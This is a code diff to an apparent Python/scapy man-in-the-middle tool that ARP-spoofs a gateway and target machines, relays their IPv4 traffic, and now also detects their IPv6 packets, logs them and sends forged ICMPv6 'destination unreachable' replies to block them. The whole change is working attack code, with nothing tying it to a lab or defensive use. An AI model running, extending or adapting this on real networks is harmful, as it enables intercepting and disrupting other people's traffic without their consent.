@@ -4,6 +4,7 @@ import socket
 import time
 import threading
 from scapy.all import ARP, Ether, IP, TCP, Raw, sendp, sniff, get_if_hwaddr, srp, conf
+from scapy.layers.inet6 import IPv6, ICMPv6DestUnreach
 
 # --- 通讯函式 ---
 def log(level, message):
@@ -122,11 +123,19 @@ def main():
         ATTACKER_MAC = get_if_hwaddr(INTERFACE)
         GATEWAY_MAC = get_mac_address(GATEWAY_IP, INTERFACE)
 
+        if ATTACKER_MAC:
+            ATTACKER_MAC = ATTACKER_MAC.lower()
+        if GATEWAY_MAC:
+            GATEWAY_MAC = GATEWAY_MAC.lower()
+
+        mac_to_ip = {}
         for ip in target_ips:
             mac = get_mac_address(ip, INTERFACE)
             if mac:
-                target_macs[ip] = mac
-                event('mac_found', {"ip": ip, "mac": mac})
+                mac_normalized = mac.lower()
+                target_macs[ip] = mac_normalized
+                mac_to_ip[mac_normalized] = ip
+                event('mac_found', {"ip": ip, "mac": mac_normalized})
             else:
                 log('error', f"Failed to get MAC for target: {ip}")
                 target_macs[ip] = None
@@ -135,6 +144,8 @@ def main():
             log('critical', "Missing essential MACs or could not find any target. Exiting.")
             return
 
+        monitored_macs = {mac for mac in target_macs.values() if mac}
+
         spoof_thread = threading.Thread(
             target=arp_spoof,
             args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE),
@@ -142,6 +153,20 @@ def main():
         )
         spoof_thread.start()
         log('info', 'ARP spoofing thread started.')
+
+        def block_ipv6_packet(packet, target_mac):
+            try:
+                offending = bytes(packet[IPv6])[:1232]
+                response = (
+                    Ether(src=ATTACKER_MAC, dst=target_mac)
+                    / IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
+                    / ICMPv6DestUnreach(code=1)
+                    / offending
+                )
+                sendp(response, iface=INTERFACE, verbose=False)
+                log('info', f"Blocked IPv6 traffic from {packet[IPv6].src} to {packet[IPv6].dst}")
+            except Exception as err:
+                log('debug', f"Failed to send IPv6 block packet: {err}")
 
         def packet_processor(packet):
             if packet.haslayer(Ether) and packet[Ether].dst == ATTACKER_MAC and packet.haslayer(IP):
@@ -162,6 +187,21 @@ def main():
                     if target_mac:
                         packet[Ether].dst = target_mac
                         sendp(packet, iface=INTERFACE, verbose=False)
+
+            elif packet.haslayer(Ether) and packet.haslayer(IPv6):
+                src_mac = packet[Ether].src.lower()
+                if src_mac in monitored_macs:
+                    src_ipv6 = packet[IPv6].src
+                    dst_ipv6 = packet[IPv6].dst
+                    human_ip = mac_to_ip.get(src_mac, src_ipv6)
+                    event('packet', {
+                        "status": "blocked",
+                        "src": human_ip,
+                        "dst": dst_ipv6,
+                        "protocol": "ipv6",
+                        "src_ipv6": src_ipv6,
+                    })
+                    block_ipv6_packet(packet, src_mac)
 
         try:
             sniff(prn=packet_processor, iface=INTERFACE, store=False, stop_filter=lambda _: stop_event_flag.is_set())
